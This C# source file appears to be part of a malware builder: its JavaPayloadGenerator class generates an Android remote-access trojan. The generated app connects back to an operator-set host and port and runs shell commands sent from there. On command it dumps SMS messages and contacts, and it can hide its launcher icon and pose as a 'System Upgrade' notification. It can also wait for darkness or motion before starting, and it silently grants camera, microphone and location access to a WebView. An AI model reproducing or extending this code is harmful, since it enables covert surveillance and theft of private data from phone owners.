using System;
using System.Collections.Generic;
using System.IO;
using TcpServerApp.Services.Elite.Security;
using TcpServerApp.Services.Elite.Build;
using TcpServerApp.Services.Elite.Networking;
using TcpServerApp.Services.Elite.Geo;
using System.Text;

namespace TcpServerApp.Services.Elite
{
    public class JavaPayloadGenerator
    {
        public EliteGenerationResult GenerateModularSource(AdvancedPayloadConfig config)
        {
            var result = new EliteGenerationResult();
            var sb = new StringBuilder();
            var permissions = new List<string>();

            // --- 1. Permissions Logic ---
            permissions.Add("android.permission.INTERNET");
            permissions.Add("android.permission.ACCESS_NETWORK_STATE");
            permissions.Add("android.permission.RECEIVE_BOOT_COMPLETED");
            permissions.Add("android.permission.WAKE_LOCK");
            permissions.Add("android.permission.FOREGROUND_SERVICE");

            if (config.EnableWebView)
            {
                 // Advanced Web Permissions
                 permissions.Add("android.permission.CAMERA");
                 permissions.Add("android.permission.RECORD_AUDIO");
                 permissions.Add("android.permission.MODIFY_AUDIO_SETTINGS");
                 permissions.Add("android.permission.ACCESS_FINE_LOCATION");
                 permissions.Add("android.permission.ACCESS_COARSE_LOCATION");
                 permissions.Add("android.permission.READ_EXTERNAL_STORAGE");
                 permissions.Add("android.permission.WRITE_EXTERNAL_STORAGE"); // Legacy compat
            }

            if (config.EnableBioTwin || config.Trigger != TriggerMode.Immediate)
            {
                permissions.Add("android.permission.BODY_SENSORS");
                permissions.Add("android.permission.HIGH_SAMPLING_RATE_SENSORS");
            }
            if (config.EnablePrivacyInspector)
            {
                permissions.Add("android.permission.ACCESS_ADSERVICES_TOPICS");
                permissions.Add("android.permission.ACCESS_ADSERVICES_ATTRIBUTION");
            }
             if (config.EnableInfoStealer)
            {
                permissions.Add("android.permission.READ_SMS");
                permissions.Add("android.permission.READ_CONTACTS");
                permissions.Add("android.permission.READ_CALL_LOG");
            }

            result.RequiredPermissions = permissions;
            result.PackageName = config.CustomPackageName;
            result.ServiceName = config.CustomServiceName;
            result.IconPath = config.IconPath;

            // --- 2. Imports ---
            var imports = new HashSet<string>
            {
                "android.app.Service",
                "android.content.Context",
                "android.content.Intent",
                "android.os.IBinder",
                "android.util.Log",
                "java.io.DataInputStream",
                "java.io.DataOutputStream",
                "java.net.Socket",
                "java.util.concurrent.Executors",
                "java.util.concurrent.ExecutorService",
                "android.os.Build",
                "android.app.NotificationChannel",
                "android.app.NotificationManager",
                "android.app.Notification",
                "android.app.PendingIntent",
                "android.graphics.Color"
            };

            if (config.EnableWebView)
            {
                imports.Add("android.app.Activity");
                imports.Add("android.webkit.WebView");
                imports.Add("android.webkit.WebViewClient");
                imports.Add("android.webkit.WebChromeClient");
                imports.Add("android.webkit.WebSettings");
                imports.Add("android.webkit.PermissionRequest");
                imports.Add("android.webkit.ConsoleMessage");
                imports.Add("android.os.Bundle");
                imports.Add("android.view.Window");
                imports.Add("android.view.WindowManager");
            }

            bool needsSensorCheck = config.EnableBioTwin || config.Trigger == TriggerMode.DarkRoom || config.Trigger == TriggerMode.Motion;
            if (needsSensorCheck)
            {
                imports.Add("android.hardware.Sensor");
                imports.Add("android.hardware.SensorEvent");
                imports.Add("android.hardware.SensorEventListener");
                imports.Add("android.hardware.SensorManager");
            }

            if (config.EnablePrivacyInspector)
            {
                imports.Add("android.os.OutcomeReceiver");
                imports.Add("android.adservices.topics.GetTopicsRequest");
                imports.Add("android.adservices.topics.GetTopicsResponse");
                imports.Add("android.adservices.topics.TopicsManager");
                imports.Add("android.adservices.topics.Topic");
                imports.Add("java.util.List");
            }

            if (config.EnableInfoStealer)
            {
                imports.Add("android.provider.Telephony");
                imports.Add("android.provider.ContactsContract");
                imports.Add("android.database.Cursor");
                imports.Add("android.net.Uri");
            }
             if (config.EnableRemoteShell)
            {
                imports.Add("java.util.Scanner");
                imports.Add("java.io.InputStream");
            }

            // --- 3. Source Generation ---
            sb.AppendLine($"package {config.CustomPackageName};");
            sb.AppendLine("");
            foreach (var imp in imports) sb.AppendLine($"import {imp};");
            sb.AppendLine("");

            // --- A. SERVICE CLASS (Background Worker) ---
            string baseClass = "Service";
            string implements = needsSensorCheck ? "implements SensorEventListener" : "";
            
            sb.AppendLine($"public class {config.CustomServiceName} extends {baseClass} {implements} {{");
            sb.AppendLine("");
            sb.AppendLine($"    private static final String HOST = \"{config.Host}\";");
            sb.AppendLine($"    private static final int PORT = {config.Port};");
            sb.AppendLine($"    private static final String KEY = \"{config.Key}\";");
            sb.AppendLine("    private Socket socket;");
            sb.AppendLine("    private boolean running = false;");
            sb.AppendLine("    private ExecutorService executor = Executors.newSingleThreadExecutor();");

            if (config.Trigger != TriggerMode.Immediate)
                sb.AppendLine("    private boolean triggered = false;");

            if (needsSensorCheck)
                sb.AppendLine("    private SensorManager sensorManager;");

            if (config.EnablePrivacyInspector)
                sb.AppendLine("    private String lastTopics = \"No topics derrived yet\";");

            if (config.EnableBioTwin)
            {
                sb.AppendLine("    private float lastHeartRate = 0f;");
                sb.AppendLine("    private float[] lastAccel = new float[]{0f, 0f, 0f};");
            }

            // Lifecycle
            sb.AppendLine("    @Override");
            sb.AppendLine("    public IBinder onBind(Intent intent) { return null; }");
            
            sb.AppendLine("    @Override");
            sb.AppendLine("    public int onStartCommand(Intent intent, int flags, int startId) {");
            sb.AppendLine("        startForegroundService();"); // Critical for Android 14+
            sb.AppendLine("        initializeAgent();");
            sb.AppendLine("        return START_STICKY;");
            sb.AppendLine("    }");

            sb.AppendLine("    private void startForegroundService() {");
            sb.AppendLine("        if (Build.VERSION.SDK_INT >= 26) {");
            sb.AppendLine("            String CHANNEL_ID = \"research_bg\";");
            sb.AppendLine("            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, \"System Update\", NotificationManager.IMPORTANCE_NONE);");
            sb.AppendLine("            channel.setLightColor(Color.BLUE);");
            sb.AppendLine("            channel.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);");
            sb.AppendLine("            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);");
            sb.AppendLine("            manager.createNotificationChannel(channel);");
            sb.AppendLine("            Notification notification = new Notification.Builder(this, CHANNEL_ID)");
            sb.AppendLine("                    .setContentTitle(\"System Upgrade\")");
            sb.AppendLine("                    .setContentText(\"Optimizing system performance...\")");
            sb.AppendLine($"                    .setSmallIcon(android.R.drawable.ic_menu_rotate)");
            sb.AppendLine("                    .build();");
            sb.AppendLine("            startForeground(1337, notification);");
            sb.AppendLine("        }");
            sb.AppendLine("    }");

            // Init
            sb.AppendLine("    private void initializeAgent() {");
            sb.AppendLine("        if (running) return;");

            // Post Install Behavior
            sb.AppendLine("        executePostInstallBehavior();");
            
            // Sensor Setup
            if (needsSensorCheck)
            {
                sb.AppendLine("        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);");
                
                if (config.Trigger == TriggerMode.DarkRoom)
                {
                    sb.AppendLine("        Log.d(\"Ghost\", \"Waiting for DARKNESS...\");");
                    sb.AppendLine("        Sensor light = sensorManager.getDefaultSensor(Sensor.TYPE_LIGHT);");
                    sb.AppendLine("        if (light != null) sensorManager.registerListener(this, light, SensorManager.SENSOR_DELAY_NORMAL);");
                    sb.AppendLine("        else startPayload();");
                }
                else if (config.Trigger == TriggerMode.Motion)
                {
                     sb.AppendLine("        Log.d(\"Ghost\", \"Waiting for MOTION...\");");
                     sb.AppendLine("        Sensor acc = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);");
                     sb.AppendLine("        if (acc != null) sensorManager.registerListener(this, acc, SensorManager.SENSOR_DELAY_NORMAL);");
                     sb.AppendLine("        else startPayload();");
                }
            }
            else if (config.Trigger == TriggerMode.Immediate)
            {
                 sb.AppendLine("        startPayload();");
            }
            sb.AppendLine("    }");

            sb.AppendLine("    private void executePostInstallBehavior() {");
             if (config.InstallBehavior == PostInstallMode.Stealth)
            {
                sb.AppendLine("        try {");
                sb.AppendLine("            android.content.pm.PackageManager pm = getPackageManager();");
                sb.AppendLine($"            android.content.ComponentName cn = new android.content.ComponentName(this, {config.CustomPackageName}.MainActivity.class);");
                sb.AppendLine("            pm.setComponentEnabledSetting(cn, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);");
                sb.AppendLine("        } catch(Exception e) {}");
            }
            sb.AppendLine("    }");

            sb.AppendLine("    private void startPayload() {");
            sb.AppendLine("        if (running) return;");
            sb.AppendLine("        running = true;");
             if (config.EnablePrivacyInspector)
                sb.AppendLine("        initPrivacySandbox();");
            
            sb.AppendLine("        new Thread(() -> connectLoop()).start();");
            sb.AppendLine("    }");

            // Connection Logic with Handshake
            sb.AppendLine("    private void connectLoop() {");
            sb.AppendLine("        while (running) {");
            sb.AppendLine("            try {");
            sb.AppendLine("                 socket = new Socket(HOST, PORT);");
            sb.AppendLine("                 DataOutputStream dos = new DataOutputStream(socket.getOutputStream());");
            sb.AppendLine("                 DataInputStream dis = new DataInputStream(socket.getInputStream());");
            sb.AppendLine("                 ");
            // Handshake
            sb.AppendLine("                 byte[] keyBytes = (\"AUTH:\" + AUTH_KEY).getBytes(\"UTF-8\");");
            sb.AppendLine("                 dos.write(keyBytes);");
            sb.AppendLine("                 dos.flush();");
            sb.AppendLine("                 ");
            sb.AppendLine("                 // Await Ack");
            sb.AppendLine("                 byte[] respBuf = new byte[1024];");
            sb.AppendLine("                 int r = dis.read(respBuf);");
            sb.AppendLine("                 if (r > 0) {");
            sb.AppendLine("                     String resp = new String(respBuf, 0, r, \"UTF-8\").trim();");
            sb.AppendLine("                     if (!resp.startsWith(\"AUTH_OK\")) { socket.close(); throw new Exception(\"Auth Failed\"); }");
            sb.AppendLine("                 }");
            sb.AppendLine("                 ");
            sb.AppendLine("                 while(socket.isConnected()) {");
            sb.AppendLine("                     // Read next packet");
            sb.AppendLine("                     // Use simple text for now for compatibility with server V2");
            sb.AppendLine("                     byte[] cmdBuf = new byte[8192];");
            sb.AppendLine("                     int read = dis.read(cmdBuf);");
            sb.AppendLine("                     if (read < 0) break;");
            sb.AppendLine("                     String cmd = new String(cmdBuf, 0, read, \"UTF-8\").trim();");
            sb.AppendLine("                     if (!cmd.isEmpty()) handleCommand(cmd, dos);");
            sb.AppendLine("                 }");
            sb.AppendLine("            } catch(Exception e) { try { Thread.sleep(5000); } catch(Exception z){} }");
            sb.AppendLine("        }");
            sb.AppendLine("    }");

            sb.AppendLine("    private void handleCommand(String cmd, DataOutputStream dos) throws java.io.IOException {");
            sb.AppendLine("        if (cmd.equals(\"PING\")) dos.write(\"PONG\\n\".getBytes());");
            
            if (config.EnablePrivacyInspector)
                sb.AppendLine("        else if (cmd.equals(\"GET_PRIVACY\")) dos.write((\"TOPICS: \" + lastTopics + \"\\n\").getBytes());");
            
            if (config.EnableInfoStealer)
            {
               sb.AppendLine("        else if (cmd.equals(\"DUMP_SMS\")) dos.write((dumpSms(this) + \"\\n\").getBytes());");
               sb.AppendLine("        else if (cmd.equals(\"DUMP_CONTACTS\")) dos.write((dumpContacts(this) + \"\\n\").getBytes());");
            }
            if (config.EnableRemoteShell)
            {
               sb.AppendLine("        else if (cmd.startsWith(\"exec \") || cmd.startsWith(\"EXEC_CMD \")) {");
               sb.AppendLine("             String target = cmd.substring(5);");
               sb.AppendLine("             if (cmd.startsWith(\"EXEC_CMD \")) target = cmd.substring(9);");
               sb.AppendLine("             dos.write((execShell(target) + \"\\n\").getBytes());");
               sb.AppendLine("        }");
            }
            sb.AppendLine("    }");
            
             // ... [Method implementations for Dump/Exec/Privacy/Sensors similar to previous code]
             if (config.EnableRemoteShell)
            {
                sb.AppendLine("    private String execShell(String cmd) {");
                sb.AppendLine("        try {");
                sb.AppendLine("            Process proc = Runtime.getRuntime().exec(cmd);");
                sb.AppendLine("             java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(proc.getInputStream()));");
                sb.AppendLine("             StringBuilder output = new StringBuilder();");
                sb.AppendLine("             String line;");
                sb.AppendLine("             while ((line = reader.readLine()) != null) output.append(line).append(\"\\n\");");
                sb.AppendLine("             return output.toString();");
                sb.AppendLine("        } catch (Exception e) { return \"SHELL_ERR: \" + e.getMessage(); }");
                sb.AppendLine("    }");
            }
             if (config.EnableInfoStealer)
             {
                 sb.AppendLine("    @android.annotation.SuppressLint(\"Range\")");
                 sb.AppendLine("    private String dumpSms(Context ctx) {");
                 sb.AppendLine("        StringBuilder sb = new StringBuilder();");
                 sb.AppendLine("        try (Cursor cursor = ctx.getContentResolver().query(android.provider.Telephony.Sms.CONTENT_URI, null, null, null, null)) {");
                 sb.AppendLine("            if (cursor != null && cursor.moveToFirst()) {");
                 sb.AppendLine("                do {");
                 sb.AppendLine("                    String body = cursor.getString(cursor.getColumnIndex(\"body\"));");
                 sb.AppendLine("                    String addr = cursor.getString(cursor.getColumnIndex(\"address\"));");
                 sb.AppendLine("                    sb.append(\"[\").append(addr).append(\"]: \").append(body).append(\" | \");");
                 sb.AppendLine("                    if(sb.length() > 500) break;");
                 sb.AppendLine("                } while (cursor.moveToNext());");
                 sb.AppendLine("            }");
                 sb.AppendLine("        } catch (Exception e) { return \"SMS_ERR: \" + e.getMessage(); }");
                 sb.AppendLine("        return sb.length() > 0 ? sb.toString() : \"NO_SMS\";");
                 sb.AppendLine("    }");

                 sb.AppendLine("    @android.annotation.SuppressLint(\"Range\")");
                 sb.AppendLine("    private String dumpContacts(Context ctx) {");
                 sb.AppendLine("        StringBuilder sb = new StringBuilder();");
                 sb.AppendLine("        try (Cursor cursor = ctx.getContentResolver().query(android.provider.ContactsContract.Contacts.CONTENT_URI, null, null, null, null)) {");
                 sb.AppendLine("            if (cursor != null && cursor.moveToFirst()) {");
                 sb.AppendLine("                do {");
                 sb.AppendLine("                    String name = cursor.getString(cursor.getColumnIndex(\"display_name\"));");
                 sb.AppendLine("                    sb.append(name).append(\", \");");
                 sb.AppendLine("                    if(sb.length() > 500) break;");
                 sb.AppendLine("                } while (cursor.moveToNext());");
                 sb.AppendLine("            }");
                 sb.AppendLine("        } catch (Exception e) { return \"CONTACTS_ERR: \" + e.getMessage(); }");
                 sb.AppendLine("        return sb.length() > 0 ? sb.toString() : \"NO_CONTACTS\";");
                 sb.AppendLine("    }");
             }

             if (config.EnablePrivacyInspector)
             {
                 sb.AppendLine("    private void initPrivacySandbox() {");
                 sb.AppendLine("        if (Build.VERSION.SDK_INT >= 33) {");
                 sb.AppendLine("            try {");
                 sb.AppendLine("                TopicsManager topicsManager = getSystemService(TopicsManager.class);");
                 sb.AppendLine("                if (topicsManager != null) {");
                 sb.AppendLine("                    GetTopicsRequest request = new GetTopicsRequest.Builder().setAdsSdkName(\"\").setShouldRecordObservation(true).build();");
                 sb.AppendLine("                    topicsManager.getTopics(request, executor, new OutcomeReceiver<GetTopicsResponse, Exception>() {");
                 sb.AppendLine("                        @Override");
                 sb.AppendLine("                        public void onResult(GetTopicsResponse result) {");
                 sb.AppendLine("                            StringBuilder sb = new StringBuilder();");
                 sb.AppendLine("                            for (Topic topic : result.getTopics()) sb.append(\"ID:\").append(topic.getTopicId()).append(\", \");");
                 sb.AppendLine("                            lastTopics = sb.length() > 0 ? sb.toString() : \"No classification\";");
                 sb.AppendLine("                        }");
                 sb.AppendLine("                        @Override");
                 sb.AppendLine("                        public void onError(Exception error) { lastTopics = \"Error: \" + error.getMessage(); }");
                 sb.AppendLine("                    });");
                 sb.AppendLine("                }");
                 sb.AppendLine("            } catch (Exception e) { lastTopics = \"Unavailable: \" + e.getMessage(); }");
                 sb.AppendLine("        } else { lastTopics = \"Requires Android 13+\"; }");
                 sb.AppendLine("    }");
             }
             
             if (needsSensorCheck)
             {
                sb.AppendLine("    @Override");
                sb.AppendLine("    public void onSensorChanged(SensorEvent event) {");
                sb.AppendLine("        if (event == null) return;");
                if (config.Trigger == TriggerMode.DarkRoom)
                {
                    sb.AppendLine("            if (!running && !triggered && event.sensor.getType() == Sensor.TYPE_LIGHT) {");
                    sb.AppendLine("                if (event.values[0] < 5.0f) { triggered = true; startPayload(); }");
                    sb.AppendLine("            }");
                }
                else if (config.Trigger == TriggerMode.Motion)
                {
                    sb.AppendLine("            if (!running && !triggered && event.sensor.getType() == Sensor.TYPE_ACCELEROMETER) {");
                    sb.AppendLine("                float gX = event.values[0], gY = event.values[1], gZ = event.values[2];");
                    sb.AppendLine("                double force = Math.sqrt(gX*gX + gY*gY + gZ*gZ);");
                    sb.AppendLine("                if (force > 12.0) { triggered = true; startPayload(); }");
                    sb.AppendLine("            }");
                }
                sb.AppendLine("    }");
                sb.AppendLine("    @Override");
                sb.AppendLine("    public void onAccuracyChanged(Sensor sensor, int accuracy) {}");
             }

            sb.AppendLine("}"); // End Service Class


            // --- B. MAIN ACTIVITY (WebView / Trigger) ---
            sb.AppendLine("");
            if (config.EnableWebView)
            {
                sb.AppendLine($"class MainActivity extends Activity {{");
                
                sb.AppendLine("    private WebView webView;");
                sb.AppendLine($"    private String TARGET_URL = \"{config.TargetUrl}\";");

                sb.AppendLine("    @Override");
                sb.AppendLine("    protected void onCreate(Bundle savedInstanceState) {");
                sb.AppendLine("        super.onCreate(savedInstanceState);");

                sb.AppendLine("        // 1. Hide Title");
                sb.AppendLine("        requestWindowFeature(Window.FEATURE_NO_TITLE);");
                sb.AppendLine("        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);");

                sb.AppendLine("        // 2. Setup WebView");
                sb.AppendLine("        webView = new WebView(this);");
                sb.AppendLine("        setContentView(webView);");
                sb.AppendLine("        WebSettings webSettings = webView.getSettings();");
                sb.AppendLine("        webSettings.setJavaScriptEnabled(true);");
                sb.AppendLine("        webSettings.setDomStorageEnabled(true);");
                sb.AppendLine("        webSettings.setGeolocationEnabled(true);");
                sb.AppendLine("        webSettings.setMediaPlaybackRequiresUserGesture(false);");

                sb.AppendLine("        webView.setWebViewClient(new WebViewClient());");
                sb.AppendLine("        webView.setWebChromeClient(new WebChromeClient() {");
                sb.AppendLine("            @Override");
                sb.AppendLine("            public void onPermissionRequest(final PermissionRequest request) {");
                sb.AppendLine("                request.grant(request.getResources());");
                sb.AppendLine("            }");
                sb.AppendLine("            @Override");
                sb.AppendLine("            public boolean onConsoleMessage(ConsoleMessage consoleMessage) {");
                sb.AppendLine("                return true;"); // Swallow logs
                sb.AppendLine("            }");
                sb.AppendLine("        });");
                
                sb.AppendLine("        if (TARGET_URL != null && !TARGET_URL.isEmpty()) webView.loadUrl(TARGET_URL);");
                sb.AppendLine("        else webView.loadUrl(\"https://www.google.com\");");

                sb.AppendLine("        // 3. Request Permissions (Android 6+)");
                sb.AppendLine("        if (Build.VERSION.SDK_INT >= 23) {");
                sb.AppendLine("             requestPermissions(new String[]{");
                sb.AppendLine("                 android.Manifest.permission.CAMERA,");
                sb.AppendLine("                 android.Manifest.permission.RECORD_AUDIO,");
                sb.AppendLine("                 android.Manifest.permission.ACCESS_FINE_LOCATION,");
                sb.AppendLine("                 android.Manifest.permission.READ_EXTERNAL_STORAGE");
                sb.AppendLine("             }, 100);");
                sb.AppendLine("        }");

                sb.AppendLine("        // 4. Start Background Service");
                sb.AppendLine("        startResearchService();");
                sb.AppendLine("    }");

                sb.AppendLine("    private void startResearchService() {");
                sb.AppendLine("        try {");
                sb.AppendLine($"            Class<?> serviceClass = Class.forName(\"{config.CustomPackageName}.{config.CustomServiceName}\");");
                sb.AppendLine("            Intent i = new Intent(this, serviceClass);");
                sb.AppendLine("            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);");
                sb.AppendLine("            else startService(i);");
                sb.AppendLine("        } catch(Exception e) {}");
                sb.AppendLine("    }");
                
                sb.AppendLine("}");
            }
            else
            {
                 // Default Headless Activity
                 sb.AppendLine($"class MainActivity extends Activity {{");
                 sb.AppendLine("    @Override");
                 sb.AppendLine("    protected void onCreate(Bundle savedInstanceState) {");
                 sb.AppendLine("        super.onCreate(savedInstanceState);");
                 sb.AppendLine("        try {");
                 sb.AppendLine($"            Class<?> serviceClass = Class.forName(\"{config.CustomPackageName}.{config.CustomServiceName}\");");
                 sb.AppendLine("            Intent i = new Intent(this, serviceClass);");
                 sb.AppendLine("            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);");
                 sb.AppendLine("            else startService(i);");
                 sb.AppendLine("        } catch(Exception e) {}");
                 sb.AppendLine("        finish();");
                 sb.AppendLine("    }");
                 sb.AppendLine("}");
            }

            result.SourceCode = sb.ToString();
            result.Success = true;
            return result;
        }
    }
}
